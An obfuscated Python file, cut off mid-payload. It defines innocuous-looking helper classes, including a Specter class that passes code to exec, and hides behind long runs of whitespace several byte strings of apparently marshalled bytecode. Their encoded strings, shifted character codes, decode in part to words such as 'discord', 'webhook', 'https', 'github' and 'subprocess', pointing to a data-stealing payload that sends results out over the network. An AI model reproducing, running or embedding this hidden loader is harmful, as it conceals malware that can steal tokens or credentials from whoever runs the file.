
Any = (...,)

class Specter:
    def __init__(self, code: str) -> None:
        self.code = code
        self.execute(...)
        return None
    def execute(self, code: str = ...) -> None:
        return exec(str(code))
    
class Func:
    def calculate(num: int) -> int:
        return num*2
    def define(key, value: Any) -> Any:
        globals()[key] = value
        return globals()[key]

__9414__ = Func.calculate(5)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__9414__', b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x01\x00\x00@\x00\x00\x00s\\\x08\x00\x00d\x00d\x01l\x00T\x00d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11d\x12d\x13d\x14d\x15d\x16d\x17d\x18d\x19d\x1ad\x1bd\x1cd\x1dd\x1ed\x1fd d!d"d#d$d%d&d\'d(d)d*d+d,d-d.d/d0d1d2d3d4d5d6d7d8d9d:d;d<d=d>d?d@dAdBdCdDdEdFdGdHdIdJdKdLdMdNdOdPe\x01dQdRdSdTdUdVdWdXdYdZd[d\\d]d^d_d`dadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudvdwdxdydzd{d|d}d~d\x7fd\x80d\x81d\x82d\x83d\x84d\x85d\x86d\x87d\x88d\x89d\x8ad\x8bd\x8cd\x8dd\x8ed\x8fd\x90d\x91d\x92d\x93d\x94d\x95d\x96d\x97d\x98ded\x99d\x9ad\x9bd\x9cd\x9dd\x9ed\x9fd\xa0d\xa1d\xa2d\xa3d\xa4d\xa5d\xa6d\xa7d>d\xa8d\xa9d\xaad\xabd\xacd\xadd\xaed\xafdFd\xb0d\xb1d\xb2d\xb3d\xb4d\xb5d\xb6d\xb7d\xb8d\xb9d\xbad\xbbd\xbcd\xbdd\xbed\xbfd\xc0d\xc1d\xc2d\xc3d\xc4d\xc5d\xc6d\xc7d\xc8d\xc9d\xcad\xcbd\xccd\xcdd\xced;d\xcfd\xd0d,d\xd1d\xd2d\xd3d\xd4d\xd5d\xd6d\xd7d\xd8d\xd9dyd\xdad\xdbd\xdcd\xddd\xded\xdfd\xe0d\xd5d\xe1d\xe2d\xe3d\xe4d\xe5d\xe6d\xe7d\xe8d\xe9d\xead\xebd\xecd\xedd\xeed\xefd\xf0d\xf1d\xf2d7d\xf3d\xf4d\xf5d\xf6d\xf7d\xf8d\xf9d\xfad\xfbd\xfcd\xfdd\xfdd\xfed\xff\x90\x01d\x00\x90\x01d\x01\x90\x01d\x02\x90\x01d\x03\x90\x01d\x04\x90\x01d\x05\x90\x01d\x06\x90\x01d\x07\x90\x01d\x08\x90\x01d\t\x90\x01d\n\x90\x01d\x0b\x90\x01d\x0c\x90\x01d\r\x90\x01d\x0e\x90\x01d\x0f\x90\x01d\x10\x90\x01d\x11\x90\x01d\x12\x90\x01d\x13\x90\x01d\x14\x90\x01d\x15\x90\x01d\x16\x90\x01d\x17\x90\x01d\x18\x90\x01d\x19\x90\x01d\x1a\x90\x01d\x1b\x90\x01d\x1c\x90\x01d\x1d\x90\x01d\x1e\x90\x01d\x1f\x90\x01d \x90\x01d!\x90\x01d"\x90\x01d#\x90\x01d$\x90\x01d%\x90\x01d&\x90\x01f/\x90\x01\\/Z\x02Z\x03Z\x04Z\x05Z\x06Z\x07Z\x08Z\tZ\nZ\x0bZ\x0cZ\rZ\x0eZ\x0fZ\x10Z\x11Z\x12Z\x13Z\x14Z\x15Z\x16Z\x17Z\x18Z\x19Z\x1aZ\x1bZ\x1cZ\x1dZ\x1eZ\x1fZ Z!Z"Z#Z$Z%Z&Z\'Z(Z)Z*Z+Z,Z-Z.Z/Z0Z1Z2Z3Z4Z5Z6Z7Z8Z9Z:Z;Z<Z=Z>Z?Z@ZAZBZCZDZEZFZGZHZIZJZKZLZMZNZOZPZQZRZSZTZUZVZWZXZYZZZ[Z\\Z]Z^Z_Z`ZaZbZcZdZeZfZgZhZiZjZkZlZmZnZoZpZqZrZsZtZuZvZwZxZyZzZ{Z|Z}Z~Z\x7fZ\x80Z\x81Z\x82Z\x83Z\x84Z\x85Z\x86Z\x87Z\x88Z\x89Z\x8aZ\x8bZ\x8cZ\x8dZ\x8eZ\x8fZ\x90Z\x91Z\x92Z\x93Z\x94Z\x95Z\x96Z\x97Z\x98Z\x99Z\x9aZ\x9bZ\x9cZ\x9dZ\x9eZ\x9fZ\xa0Z\xa1Z\xa2Z\xa3Z\xa4Z\xa5Z\xa6Z\xa7Z\xa8Z\xa9Z\xaaZ\xabZ\xacZ\xadZ\xaeZ\xafZ\xb0Z\xb1Z\xb2Z\xb3Z\xb4Z\xb5Z\xb6Z\xb7Z\xb8Z\xb9Z\xbaZ\xbbZ\xbcZ\xbdZ\xbeZ\xbfZ\xc0Z\xc1Z\xc2Z\xc3Z\xc4Z\xc5Z\xc6Z\xc7Z\xc8Z\xc9Z\xcaZ\xcbZ\xccZ\xcdZ\xceZ\xcfZ\xd0Z\xd1Z\xd2Z\xd3Z\xd4Z\xd5Z\xd6Z\xd7Z\xd8Z\xd9Z\xdaZ\xdbZ\xdcZ\xddZ\xdeZ\xdfZ\xe0Z\xe1Z\xe2Z\xe3Z\xe4Z\xe5Z\xe6Z\xe7Z\xe8Z\xe9Z\xeaZ\xebZ\xecZ\xedZ\xeeZ\xefZ\xf0Z\xf1Z\xf2Z\xf3Z\xf4Z\xf5Z\xf6Z\xf7Z\xf8Z\xf9Z\xfaZ\xfbZ\xfcZ\xfdZ\xfeZ\xff\x90\x01Z\x00\x90\x01Z\x01\x90\x01Z\x02\x90\x01Z\x03\x90\x01Z\x04\x90\x01Z\x05\x90\x01Z\x06\x90\x01Z\x07\x90\x01Z\x08\x90\x01Z\t\x90\x01Z\n\x90\x01Z\x0b\x90\x01Z\x0c\x90\x01Z\r\x90\x01Z\x0e\x90\x01Z\x0f\x90\x01Z\x10\x90\x01Z\x11\x90\x01Z\x12\x90\x01Z\x13\x90\x01Z\x14\x90\x01Z\x15\x90\x01Z\x16\x90\x01Z\x17\x90\x01Z\x18\x90\x01Z\x19\x90\x01Z\x1a\x90\x01Z\x1b\x90\x01Z\x1c\x90\x01Z\x1d\x90\x01Z\x1e\x90\x01Z\x1f\x90\x01Z \x90\x01Z!\x90\x01Z"\x90\x01Z#\x90\x01Z$\x90\x01Z%\x90\x01Z&\x90\x01Z\'\x90\x01Z(\x90\x01Z)\x90\x01Z*\x90\x01Z+\x90\x01Z,\x90\x01Z-\x90\x01Z.\x90\x01Z/\x90\x01Z0\x90\x01d\'\x90\x01d(\x84\x00\x90\x01Z1\x90\x01d)\x90\x01d(\x84\x00\x90\x01e"e\xeee\ne\x8fereRe\xc4eT\x90\x01e\x1ee\xaee\xdaefe\xe3e\x84e\xc6e/e\xa7\x90\x01e\x18e\xc5e\x15e\x13e\xabe}e\x86efe\xf4eF\x90\x01e\x10eYe\xd9exe\xa2e\xf7e\xeaeMe7eceBe\x14\x90\x01e\x04\x90\x01e e\xb1e>e\xa1e:e\xceeF\x90\x01e\x1ae\x92e\xa4e\x82e7e\x0be\xf5e\x89eke>e\xebe\xcce#\x90\x01e#eO\x90\x01e.e\xfdeAe+e\xb4e\xd7e\x1c\x90\x01e\x03e\x16e\xb2e\xa9eKe\xade e0eveZe\xd4eje\xfae\xb0\x90\x01e\x1de`eXe~e\xc2e\xc9e[e\xf6e\xc8e\xdb\x90\x01e0e\x1ee\'e\xffe\x08e<e-e\x05e"e\x80\x90\x01e\x11e\xc0ehe*eze\xd5e\x99\x90\x01e,e\x90\x90\x01e\x13e^\x90\x01e\ne\xede\x11e\x1fe\xe1e\xba\x90\x01e\t\x90\x01e+\x90\x01e-e\xdee\xdce\xb8e1eNewe\xa8e\x9ce\x95ele\xdbe\xafe\x9fe2e)e\xbb\x90\x01e\x06e\xbfeVe\xeceb\x90\x01e\x0fe\x81e\xc1e(e\x0fe?e\x02ePe\x12e9\x90\x01e\x06ete\x91e\x17e\x83e]\x90\x01e\x15e\xe9\x90\x01e%\x90\x01e&e\xdd\x90\x01e\x16e\x85ey\x90\x01e\x0ee@e\x87ene{eWe3e\x88e\xbce\xf9e\x19\x90\x01e\x1cese$e&eHeqe,\x90\x01e/e6e\xa6e\x8ee;e\xb6\x90\x01e\x12e\x1d\x90\x01e\x0ceGe,e_e\xd1e\xf3e\x93eSe\x94eCe\x96e\x9de\xefe\xe6\x90\x01e\x1be\xcae\xa0e\xb9e\xf8e5\x90\x01e\x02\x90\x01e)\x90\x01e\x19e\x8ce\xbeeEe\xace\x1ae\xf1eme\x10e\x0c\x90\x01e\x05eie\x03eze\\\x90\x01e\x17\x90\x01e!')
__2350__ = Func.calculate(1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__2350__', b"e4e\te\xd8e\xfce\xdf\x90\x01e\x14\x90\x01e\x1fe\x9be\xc3e8e\x04e\xd2e\xe5e\xe7eLeUe\x07\x90\x01e(\x90\x01e*e\re\xc7e!\x90\x01e\x00eue\xd0e\xcbe=e.\x90\x01e\x08\x90\x01e\x01\x90\x01e\re\xcde\x97\x90\x01e'e\xbde\xb7e|e\xf0epeoeeeae\x0eeDe\x8be\xa5e\xa3ege\xcf\x90\x01e$e\xfee\x8de\x1bede\x9ee\x7fe\xe4eJe\x98e\x18e\x8ae;e\xf2\x90\x01e\x0beIe\xb5e\xe2\x90\x01g,\x83\x01\x01\x00\x90\x01d*S\x00(+\x01\x00\x00\xe9\x00\x00\x00\x00)\x01\xda\x01*s\x1a\x00\x00\x0047\x0064\x0016\x0038\x0038\x00118\x00120\x00111s\x19\x00\x00\x00117\x0046\x0047\x0064\x0016\x0038\x0038\x00121s\x1d\x00\x00\x00106\x00107\x00108\x0038\x00105\x00121\x0046\x00108s\x1e\x00\x00\x0038\x00120\x00107\x00119\x00123\x00107\x00121\x00122s\x0f\x00\x00\x00107\x00126\x00107\x00105s\x1f\x00\x00\x00118\x00105\x00121\x00110\x00123\x00122\x00106\x00117s\x1d\x00\x00\x0038\x00117\x00121\x0016\x00111\x00115\x00118\x00117s\x1a\x00\x00\x00107\x00126\x00107\x0047\x0064\x0016\x0038\x0038s\x1f\x00\x00\x00107\x00117\x00104\x00108\x00123\x00121\x00105\x00103s\x1b\x00\x00\x0038\x0038\x0040\x0089\x00118\x00107\x00105\x00122s\x18\x00\x00\x00103\x0038\x0052\x0084\x0073\x0078\x0079\x0038s\x1d\x00\x00\x00122\x00107\x00115\x0046\x0040\x00121\x00110\x00123s\x1a\x00\x00\x0046\x0040\x00118\x00127\x0038\x0051\x00115\x0038s\x1c\x00\x00\x00107\x00118\x0046\x00126\x0047\x0016\x00106\x00107s\x1d\x00\x00\x00111\x00118\x00122\x00121\x0038\x00111\x00116\x0038s\x1b\x00\x00\x0038\x0076\x00114\x00103\x00121\x00113\x0050\x0038s\x1b\x00\x00\x00108\x0038\x00115\x00103\x00105\x0046\x0047\x0064s\x19\x00\x00\x0038\x0038\x0038\x0038\x00111\x00108\x0038\x0046s\x1c\x00\x00\x0038\x0040\x00110\x00122\x00122\x00118\x00121\x0064s\x1a\x00\x00\x0016\x0016\x0016\x00122\x00120\x00127\x0064\x0016s\x1c\x00\x00\x00106\x0038\x00125\x00111\x00122\x00110\x0038\x0089s\x1d\x00\x00\x0038\x0038\x00118\x00123\x00104\x00114\x00111\x00105s\x1a\x00\x00\x00114\x0056\x0057\x0016\x0038\x0038\x00120\x00107s\x1e\x00\x00\x0067\x00115\x00107\x00121\x00121\x00103\x00109\x00107s\x1e\x00\x00\x00105\x00103\x00116\x0038\x00121\x00122\x00111\x00114s\x19\x00\x00\x0046\x0047\x0064\x0016\x0038\x0038\x00118\x00120s\x1d\x00\x00\x00103\x0038\x00108\x00111\x00114\x00107\x0038\x00117s\x1a\x00\x00\x00121\x00107\x00120\x0045\x0047\x0016\x0038\x0038s\x1e\x00\x00\x00105\x0016\x00111\x00115\x00118\x00117\x00120\x00122s\x1f\x00\x00\x00120\x00107\x00116\x00106\x00107\x00120\x00101\x00122s\x1a\x00\x00\x0059\x0060\x0098\x00116\x0077\x00111\x00122\x0078s\x18\x00\x00\x0038\x0053\x00122\x0038\x0055\x0040\x0047\x0016s\x1e\x00\x00\x00121\x0052\x00121\x00122\x00120\x00123\x00105\x00122s\x1c\x00\x00\x00117\x00104\x00103\x00114\x00121\x0046\x0047\x0016s\x1c\x00\x00\x00104\x00121\x00111\x00122\x00107\x0047\x0064\x0016\xf3\x01\x00\x00\x006s\x1a\x00\x00\x0038\x0038\x00123\x00120\x00114\x0038\x0067\x0038s\x1e\x00\x00\x0038\x00118\x00114\x00103\x00122\x00108\x00117\x00120s\x1e\x00\x00\x00122\x00111\x00115\x00107\x0052\x00121\x00114\x00107s\x1e\x00\x00\x00115\x00103\x00105\x0038\x00111\x00115\x00118\x00117s\x1e\x00\x00\x00111\x00115\x00118\x00117\x00120\x00122\x0038\x00121s\x1c\x00\x00\x00116\x00118\x00123\x00122\x0046\x0040\x0095\x00117s\x1f\x00\x00\x00123\x00122\x00118\x00123\x00122\x00101\x00116\x00103s\x1e\x00\x00\x00121\x00122\x00121\x0016\x00108\x00120\x00117\x00115s\x1b\x00\x00\x0040\x0047\x0016\x00106\x00107\x00108\x0038\x00110s\x1e\x00\x00\x00109\x00109\x0053\x00118\x00114\x00103\x00109\x00123s\x1d\x00\x00\x00123\x00104\x0064\x0038\x00110\x00122\x00122\x00118s\x1d\x00\x00\x0038\x00121\x00117\x00105\x00113\x00107\x00122\x0016s\x1e\x00\x00\x00108\x00120\x00117\x00115\x0038\x00109\x00107\x00122s\x1e\x00\x00\x0067\x00125\x00107\x00104\x00110\x00117\x00117\x00113s\x1e\x00\x00\x00114\x00117\x00103\x00106\x00107\x00126\x00107\x0046s\x17\x00\x00\x0038\x0073\x0049\x0049\x0050\x0038\x0073\x0050s\x1e\x00\x00\x00125\x00116\x00114\x00117\x00103\x00106\x0052\x00110s\x18\x00\x00\x00120\x0016\x0038\x0038\x0038\x0038\x0038\x0038s\x1b\x00\x00\x00118\x0052\x00104\x00103\x00122\x0040\x0047\x0016s\x1c\x00\x00\x0016\x0038\x0038\x00109\x00107\x00122\x00101\x00115s\x1a\x00\x00")
__4664__ = Func.calculate(3)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__4664__', b'\x00107\x00101\x00101\x0038\x0039\x0067\x0038\x0040s\x1e\x00\x00\x00123\x00107\x00121\x00122\x00121\x0052\x00109\x00107s\x1e\x00\x00\x00120\x00122\x0038\x00120\x00107\x00119\x00123\x00107s\x1e\x00\x00\x00110\x00107\x00103\x00122\x0052\x00107\x00126\x00107s\x17\x00\x00\x0038\x0038\x0038\x0038\x0038\x0038\x0038\x0038s\x1d\x00\x00\x00108\x0038\x00104\x00103\x00120\x00113\x0046\x00111s\x1d\x00\x00\x00104\x00110\x00117\x00117\x00113\x0050\x0038\x00115s\x19\x00\x00\x00122\x0064\x0016\x0038\x0038\x0038\x0038\x00111s\x1c\x00\x00\x00117\x00120\x00106\x00101\x00101\x0038\x0039\x0067s\x1b\x00\x00\x0046\x0047\x0016\x00106\x00107\x00108\x0038\x00125s\x1e\x00\x00\x00118\x00111\x00118\x0038\x00111\x00116\x00121\x00122s\x1e\x00\x00\x00117\x00116\x0038\x00121\x00110\x00107\x00114\x00114s\x19\x00\x00\x0038\x00117\x00120\x0016\x0038\x0038\x0038\x0038s\x1e\x00\x00\x00116\x0046\x00110\x00122\x00115\x00114\x00101\x00117s\x1e\x00\x00\x00125\x00107\x00104\x00121\x00111\x00122\x00107\x0016s\x1e\x00\x00\x00107\x00121\x00118\x0052\x00121\x00122\x00103\x00122s\x18\x00\x00\x00114\x0056\x0057\x0047\x0064\x0016\x0038\x0038s\x1d\x00\x00\x00120\x0064\x0038\x00104\x00111\x00114\x00114\x00127s\x1e\x00\x00\x00121\x00105\x00117\x00115\x00118\x0052\x00104\x00103s\x1d\x00\x00\x00107\x00105\x00122\x00107\x00120\x0040\x0038\x00117s\x1e\x00\x00\x00108\x00120\x00117\x00115\x0038\x00106\x00111\x00121s\x18\x00\x00\x0038\x0038\x0038\x0038\x0038\x0038\x0038\x00111s\x1c\x00\x00\x00116\x00122\x0046\x00111\x0047\x0016\x00106\x00107s\x1c\x00\x00\x00122\x00122\x00118\x00121\x0064\x0053\x0053\x00109s\x1a\x00\x00\x00107\x00126\x00122\x0047\x0016\x0038\x0038\x0038s\x1e\x00\x00\x00115\x0053\x00104\x00111\x00114\x00114\x00127\x00122s\x1b\x00\x00\x00122\x0040\x0047\x0016\x00106\x00107\x00108\x0038s\x1e\x00\x00\x00122\x0038\x00120\x00107\x00119\x00123\x00107\x00121s\x1e\x00\x00\x00105\x00117\x00120\x00106\x0046\x00123\x00120\x00114s\x1d\x00\x00\x0052\x00109\x00109\x0053\x00118\x00114\x00103\x00109s\x1d\x00\x00\x00122\x00110\x00123\x00104\x00101\x00101\x0038\x0039s\x1d\x00\x00\x00123\x00104\x0052\x00105\x00117\x00115\x0053\x00104s\x1b\x00\x00\x0045\x0047\x0052\x00107\x00126\x00111\x00122\x0046s\x1c\x00\x00\x00121\x0052\x0086\x00117\x00118\x00107\x00116\x0046s\x1e\x00\x00\x00107\x00119\x00123\x00107\x00121\x00122\x00121\x0052s\x1d\x00\x00\x00117\x00120\x00122\x0038\x00120\x00107\x0016\x00108s\x1a\x00\x00\x00115\x00107\x0050\x0038\x0045\x00125\x0045\x0047s\x1e\x00\x00\x0053\x00106\x00111\x00121\x00105\x00117\x00120\x00106s\x1e\x00\x00\x00121\x0052\x00121\x00127\x00121\x00122\x00107\x00115s\x1a\x00\x00\x00111\x00114\x00114\x0046\x0047\x0064\x0016\x0038s\x1d\x00\x00\x0038\x0038\x00101\x00101\x00106\x00111\x00121\x00105s\x1a\x00\x00\x00111\x00116\x00122\x0046\x0040\x0075\x0088\x0088s\x19\x00\x00\x00106\x0046\x0047\x0064\x0016\x0038\x0038\x00117s\x1f\x00\x00\x00104\x00111\x00114\x00114\x00127\x00122\x00110\x00107s\x1c\x00\x00\x0047\x0016\x00106\x00107\x00108\x0038\x00107\x00116s\x1d\x00\x00\x00111\x00124\x00107\x0074\x00111\x00105\x00122\x0016s\x1e\x00\x00\x00107\x00108\x0038\x00118\x00105\x00111\x00116\x00108s\x1a\x00\x00\x00117\x00103\x00122\x0057\x0059\x0060\x0053\x0089s\x1b\x00\x00\x00114\x00121\x0046\x0047\x0038\x00117\x00120\x0016s\x1f\x00\x00\x00120\x00107\x00119\x00123\x00107\x00121\x00122\x00121s\x1e\x00\x00\x00122\x00110\x00117\x00116\x0038\x00121\x00105\x00120s\x1c\x00\x00\x0016\x0038\x0038\x00106\x00111\x00121\x00105\x00117s\x1e\x00\x00\x0038\x00114\x00103\x00128\x00127\x00114\x00117\x00103s\x1b\x00\x00\x00121\x0055\x0040\x0047\x0016\x00106\x00107\x00108s\x1d\x00\x00\x0038\x0038\x00110\x00122\x00115\x00114\x00101\x00117s\x1b\x00\x00\x00122\x00107\x00120\x0016\x0016\x0041\x0038\x00110s\x1e\x00\x00\x00104\x00106\x00117\x00125\x00116\x0046\x00125\x00107s\x1c\x00\x00\x00121\x00121\x0046\x0047\x0016\x00106\x00107\x00108s\x19\x00\x00\x00110\x0046\x0047\x0064\x0016\x0038\x0038\x00117s\x1c\x00\x00\x00121\x0064\x0053\x0053\x00109\x00111\x00122\x00110s\x1f\x00\x00\x00105\x001')
__8765__ = Func.calculate(5)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__8765__', b'17\x00120\x00106\x00125\x00107\x00104\x00110s\x1c\x00\x00\x0064\x0053\x0053\x00109\x00111\x00122\x00110\x00123s\x1d\x00\x00\x0016\x00106\x00107\x00108\x0038\x00106\x00115\x00107s\x1f\x00\x00\x00123\x00104\x00118\x00120\x00117\x00105\x00107\x00121s\x1b\x00\x00\x00120\x00106\x0038\x0067\x0038\x0074\x00111\x00121s\x1e\x00\x00\x00103\x00120\x00122\x00108\x00111\x00114\x00107\x0046s\x1e\x00\x00\x0038\x00101\x00101\x00103\x00123\x00122\x00110\x00117s\x19\x00\x00\x00123\x00107\x0040\x0047\x0016\x0038\x0038\x0038s\x1e\x00\x00\x0038\x00108\x00107\x00122\x00105\x00110\x00103\x00118s\x1e\x00\x00\x00123\x00120\x00107\x00121\x0038\x00111\x00115\x00118s\x1d\x00\x00\x0016\x00106\x00107\x00108\x0038\x00110\x00117\x00114s\x1c\x00\x00\x00117\x00120\x00114\x00106\x0039\x0040\x0038\x00117s\x1b\x00\x00\x00101\x00111\x00118\x0038\x0067\x0038\x0038\x00120s\x1b\x00\x00\x0016\x0041\x0038\x00112\x00117\x00111\x00116\x0038s\x1e\x00\x00\x00104\x00114\x00111\x00105\x00101\x00111\x00118\x0047s\x1a\x00\x00\x00120\x00101\x00101\x0038\x0039\x0067\x0038\x0040s\x1d\x00\x00\x00107\x00121\x00121\x00103\x00109\x00107\x0047\x0064s\x1b\x00\x00\x0047\x0016\x0038\x0038\x00106\x00111\x00121\x00105s\x1e\x00\x00\x00111\x00116\x0038\x00109\x00114\x00117\x00104\x00103s\x1c\x00\x00\x00121\x00118\x0038\x0067\x0038\x00120\x00107\x00119s\x1c\x00\x00\x00103\x00114\x00114\x0038\x0051\x00120\x0038\x00120s\x1e\x00\x00\x00120\x00107\x00116\x00122\x00114\x00127\x0038\x00111s\x1c\x00\x00\x00104\x00120\x00103\x00113\x00107\x0058\x0054\x0058s\x1c\x00\x00\x00107\x00119\x0038\x0067\x0038\x00120\x00107\x00119s\x1d\x00\x00\x00122\x00107\x00106\x0038\x0089\x00118\x00107\x00105s\x1d\x00\x00\x0016\x00111\x00115\x00118\x00117\x00120\x00122\x0038s\x1a\x00\x00\x0038\x00126\x00111\x00118\x0046\x0047\x0064\x0016s\x1b\x00\x00\x00106\x00107\x00101\x00101\x0038\x0039\x0067\x0038s\x1d\x00\x00\x00122\x00107\x0046\x00120\x00107\x00119\x0052\x00122s\x1d\x00\x00\x0038\x00108\x0052\x00105\x00114\x00117\x00121\x00107s\x1d\x00\x00\x00120\x00106\x0016\x00108\x00120\x00117\x00115\x0038s\x1d\x00\x00\x00111\x00108\x00111\x00105\x00117\x00116\x0046\x0047s\x1e\x00\x00\x00105\x00117\x00115\x00118\x0052\x00104\x00103\x00122s\x1c\x00\x00\x00123\x00120\x00114\x0038\x0067\x0038\x00123\x00120s\x1e\x00\x00\x0038\x00121\x00123\x00104\x00118\x00120\x00117\x00105s\x1f\x00\x00\x00122\x00103\x00120\x00122\x00108\x00111\x00114\x00107s\x1d\x00\x00\x00120\x00122\x0038\x0074\x00111\x00121\x00105\x00117s\x1b\x00\x00\x0064\x0016\x0038\x0038\x00111\x00115\x00118\x00117s\x1a\x00\x00\x0085\x0088\x0040\x0047\x0016\x00106\x00107\x00108s\x1d\x00\x00\x00120\x00122\x0038\x00122\x00111\x00115\x00107\x0016s\x1a\x00\x00\x0073\x0078\x0079\x0038\x00111\x00121\x0038\x00115s\x1f\x00\x00\x00101\x00101\x00114\x00111\x00105\x00107\x00116\x00121s\x1d\x00\x00\x00104\x0052\x00105\x00117\x00115\x0053\x00104\x00111s\x1d\x00\x00\x00116\x00122\x00121\x0052\x00122\x00126\x00122\x0040s\x1c\x00\x00\x0040\x0078\x00107\x00114\x00114\x00117\x0038\x00125s\x1f\x00\x00\x00107\x00119\x00123\x00111\x00120\x00107\x00115\x00107s\x1b\x00\x00\x00122\x00115\x00114\x0045\x0016\x0038\x0038\x00120s\x1d\x00\x00\x00107\x0038\x00108\x00117\x00120\x0038\x00115\x00117s\x1e\x00\x00\x00117\x00117\x00113\x0038\x00111\x00115\x00118\x00117s\x1d\x00\x00\x00116\x0098\x00116\x0071\x00123\x00122\x00110\x00117s\x17\x00\x00\x0016\x0038\x0038\x0038\x0038\x0038\x0038\x0038s\x1c\x00\x00\x0038\x00121\x00117\x0038\x00127\x00117\x00123\x0038s\x1e\x00\x00\x00122\x00110\x00107\x00109\x00117\x00103\x00122\x0057s\x1c\x00\x00\x0060\x0053\x0089\x00118\x00107\x00105\x00122\x00107s\x1e\x00\x00\x00109\x00107\x00122\x0016\x00111\x00115\x00118\x00117s\x1d\x00\x00\x0074\x00111\x00121\x00105\x00117\x00120\x00106\x0064s\x1c\x00\x00\x00109\x00123\x00107\x0040\x0038\x00117\x00120\x0016s\x1d\x00\x00\x00118\x00107\x00105\x00122\x00107\x00120\x0039\x0098s\x1d\x00\x00\x00123\x0038\x00112\x00123\x00121\x00122\x0038\x00107s\x1e\x00\x00\x00123\x00121\x00101\x00105\x00117\x00106\x00')
__5235__ = Func.calculate(9)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__5235__', b'107\x0047s\x1b\x00\x00\x00122\x0046\x00123\x00120\x00114\x0050\x0038\x0045s\x1b\x00\x00\x0016\x0038\x0038\x00117\x00121\x0052\x00121\x00122s\x1e\x00\x00\x00122\x0016\x00111\x00115\x00118\x00117\x00120\x00122s\x1e\x00\x00\x00103\x00106\x00107\x0038\x00125\x00111\x00122\x00110s\x1e\x00\x00\x00111\x00115\x00118\x00117\x00120\x00122\x0038\x00118s\x1e\x00\x00\x00120\x00122\x0038\x00109\x00107\x00122\x00101\x00115s\x1e\x00\x00\x00117\x00120\x00106\x0052\x00118\x00117\x00121\x00122s\x1c\x00\x00\x00106\x00122\x00107\x00126\x00122\x0046\x0047\x0064s\x1d\x00\x00\x00116\x0038\x00103\x0038\x00118\x00127\x00122\x00110s\x1e\x00\x00\x00121\x00121\x0016\x00111\x00115\x00118\x00117\x00120s\x1e\x00\x00\x0079\x00116\x00121\x00107\x00116\x00121\x00111\x00122s\x19\x00\x00\x00106\x0046\x00126\x0047\x0064\x0016\x0038\x0038s\x1e\x00\x00\x0038\x00101\x00101\x00111\x00115\x00118\x00117\x00120s\x1d\x00\x00\x0046\x0040\x00105\x00118\x00118\x00105\x00117\x00115s\x1e\x00\x00\x00111\x00122\x00110\x00123\x00104\x0052\x00105\x00117s\x1d\x00\x00\x00116\x0038\x00122\x00117\x00117\x00114\x00121\x0039s\x1e\x00\x00\x00106\x00111\x00121\x00105\x00117\x00120\x00106\x0052s\x1d\x00\x00\x00122\x00106\x00117\x00125\x00116\x0038\x0053\x00121s\x1e\x00\x00\x00108\x00120\x00117\x00115\x0038\x00118\x00114\x00127s\x1d\x00\x00\x00122\x00101\x00101\x0046\x0045\x00121\x00127\x00121s\x1b\x00\x00\x0038\x00104\x00103\x00120\x00113\x0046\x0040\x0084s\x1d\x00\x00\x00111\x00114\x00107\x0046\x0040\x00105\x00118\x00123s\x1d\x00\x00\x00117\x00122\x0038\x00111\x00116\x0038\x00109\x00114s\x1d\x00\x00\x00114\x00107\x0046\x0040\x00110\x00122\x00115\x00114s\x17\x00\x00\x0075\x0086\x0082\x0051\x0056\x0052\x0054\x0040s\x18\x00\x00\x00106\x0058\x0054\x0058\x0046\x0047\x0064\x0016s\x1e\x00\x00\x00121\x0052\x00121\x00122\x00103\x00120\x00122\x00108s\x1a\x00\x00\x0038\x00103\x00121\x0038\x00108\x0064\x0016\x0038s\x1a\x00\x00\x00111\x00114\x00107\x0080\x0047\x0064\x0016\x0038s\x1f\x00\x00\x00111\x00114\x00114\x00127\x00122\x00110\x00107\x00109s\x1e\x00\x00\x00121\x0016\x00111\x00115\x00118\x00117\x00120\x00122s\x1e\x00\x00\x00126\x00107\x00105\x00123\x00122\x00107\x00106\x0038s\x1e\x00\x00\x00117\x00121\x0052\x00121\x00122\x00103\x00120\x00122s\x1c\x00\x00\x0067\x0038\x0040\x00110\x00122\x00122\x00118\x00121s\x1a\x00\x00\x00120\x0016\x0016\x0041\x0038\x00104\x00127\x0038s\x1d\x00\x00\x0038\x00111\x00115\x00118\x00117\x00120\x00122\x0038s\x1e\x00\x00\x00104\x0052\x00120\x00107\x00119\x00123\x00107\x00121s\x1b\x00\x00\x0052\x00122\x00107\x00126\x00122\x0016\x0038\x0038s\x1e\x00\x00\x00120\x00122\x0038\x00123\x00120\x00114\x00114\x00111s\x1c\x00\x00\x0047\x0016\x00106\x00107\x00108\x0038\x00105\x00118s\x1e\x00\x00\x00107\x00115\x00118\x00114\x00103\x00122\x00107\x0016\xf3\x00\x00\x00\x00s\x1b\x00\x00\x00109\x00117\x00103\x00122\x0057\x0059\x0060\x0016s\x1e\x00\x00\x00111\x00112\x00121\x00117\x00116\x0046\x00123\x00120s\x1d\x00\x00\x0038\x00117\x00121\x0052\x00121\x00122\x00103\x00120s\x1a\x00\x00\x00107\x00108\x0038\x0084\x0073\x0078\x0079\x00110s\x1d\x00\x00\x00122\x00108\x00111\x00114\x00107\x0046\x0040\x00105s\x1c\x00\x00\x00118\x0064\x0053\x0053\x00125\x00122\x00108\x00111s\x1a\x00\x00\x00103\x00122\x0057\x0059\x0060\x0053\x0089\x00118s\x1b\x00\x00\x0040\x0076\x00123\x00116\x00105\x0040\x0038\x00116s\x1d\x00\x00\x00122\x00121\x0016\x00106\x00107\x00108\x0038\x00113s\x1e\x00\x00\x00113\x0038\x00111\x00115\x00118\x00117\x00120\x00122s\x1d\x00\x00\x00123\x0038\x00112\x00123\x00121\x00122\x0038\x00106s\x1d\x00\x00\x00120\x00122\x0038\x00105\x00117\x00116\x0016\x00106s\x1d\x00\x00\x0040\x00115\x00106\x00122\x00126\x00122\x0052\x00118s\x1d\x00\x00\x00114\x0038\x00120\x00123\x00116\x0038\x00118\x00127s\x1b\x00\x00\x00122\x0046\x00123\x00120\x00114\x0047\x0016\x0038s\x1b\x00\x00\x0038\x0038\x0038\x00108\x0052\x00125\x00120\x00111s\x1b\x00\x00\x00109\x00117\x00103\x00122\x0057\x0059\x0060\x0040s\x1c\x00\x0